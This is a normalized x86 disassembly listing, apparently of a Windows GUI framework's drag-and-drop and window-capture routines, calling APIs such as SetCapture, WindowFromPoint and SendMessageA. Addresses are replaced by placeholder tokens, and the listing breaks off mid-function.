cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_438a78
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_438b08
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_438cec
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c054
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_40447c
mov eax edi
mov edx esi
call sub_403fb0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_438d30
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c054
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_40447c
mov eax edi
mov edx esi
call sub_403fb0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_438d9c
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033b0
test al al
jne r-xdata
mov eax ebx
call sub_4423cc
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_438e48
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_413918
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_438e7c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4423cc
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_438ea4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_4026bc
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_438e7c
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_438e48
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_4137bc
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_413994
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_438f00
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_4137f0
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_413918
mov edx 0x8
call sub_4026dc
inc esi
dec ebx
jne r-xdata
sub_438f34
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_413918
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_438e48
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_438f98
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_438ff8
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_403174
mov edx esp
mov eax esi
call sub_4041c0
add esp 0x100
pop esi
pop ebx
retn
sub_439034
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4390fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_43a154
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_439adc
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406878
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_439adc
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
call sub_43a154
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_439adc
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_43a154
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_439103
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45b724
call sub_403a14
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_43a154
sub_43915c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_439186
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4391ec
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_438f98
mov eax esi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_439218
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_403420
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_439244
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_403420
xor edx edx
sub_43929c
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_443fd0
sub_4392bc
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_443fb8
sub_4392e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4391c8
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cae8
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_421d14
mov edx eax
mov eax esi
call sub_41cc64
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_439344
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_403224
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403214
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_439374
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4391ec
mov eax esi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_4393d0
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_403420
pop edi
pop esi
pop ebp
retn 0x4
sub_4393f4
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_439418
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_4393f4
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_4393f4
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_4394d4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_439540
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_439990
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_438aac
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_4423cc
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_4423cc
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4423cc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_403420
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_4394d4
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_4423cc
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_4423cc
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_4396d8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_4423cc
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4423cc
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_43971c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_438f34
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_439540
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_413918
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_4423cc
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_4396d8
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_403420
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_440efc
dec eax
jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_438ea4
sub_439878
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_413974
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_413808
mov edx edi
mov eax [ rw-data ]
call sub_4137bc
jmp r-xdata
sub_4398d8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_439930
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_40441c
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_438a78
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_439990
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_439930
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_4399bc
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_43971c
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_439990
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_4398d8
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_4423cc
mov [ esi ] eax
sub_439a0c
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_4398d8
cmp eax 0x1
sbb eax eax
inc eax
sub_439a48
push ebx
push esi
push edi
xor edi edi
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_440e68
test eax eax
je r-xdata
mov eax esi
call sub_440e68
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_43a478
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x178 ]
call sub_413918
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_413974
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx eax
mov eax esi
call sub_440e7c
mov edi eax
jmp r-xdata
sub_439adc
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_4399bc
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_443e8c
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_439a0c
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_439a0c
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_43b710
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_439a0c
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45968c
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_443e74
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_439a48
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_403420
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_443f74
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_443e8c
jmp r-xdata
mov eax [ rw-data ]
call sub_443fe8
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45968c
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_43b710
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_403420
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_403420
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_407aec
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_439dac
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_438fd8
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_443e8c
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
